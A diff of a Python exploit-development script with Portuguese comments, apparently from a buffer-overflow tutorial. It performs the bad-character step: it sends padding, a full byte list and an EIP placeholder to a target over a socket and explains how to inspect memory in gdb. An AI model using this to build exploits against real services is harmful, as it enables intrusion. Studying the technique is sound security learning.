@@ -1,5 +1,5 @@
-#antes de começar, defina o ponto de parada apontado o local de entrada no gdb
-#disas main
+#antes de começar, defina o ponto de parada apontando o local de entrada no gdb com o comando
+#disas main - para saber o ponto de entrada
 #breakpoint <ponto de parada informado>
 
 import socket
@@ -50,7 +50,7 @@ def bad_chars():
     offset = #coloque aqui o valor para chegar no EIP conseguido nas etapas anteriores - 256 (valor da lista) - 4 (local do eip)
     buffer = b"A" * offset
     eip = b"B" * 4
-    payload = buffer + eip + all_chars_bytes  # Concatene bytes em vez de uma lista
+    payload = buffer + all_chars_bytes + eip # Concatene bytes em vez de uma lista
     
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((IP, port))
@@ -59,8 +59,7 @@ def bad_chars():
 
 bad_chars()
 
-#após rodar o scrip no gdb verifique se os bytes segiram a sequencia corretamente
-
+#após rodar o script no gdb verifique se os bytes segiram a sequencia corretamente com o comando
 #x/<valor do EIP> $esp+1000
 
 #verifique se todos seguem a sequencia correta, caso não siga retire o byte que causou o erro e repita este passo
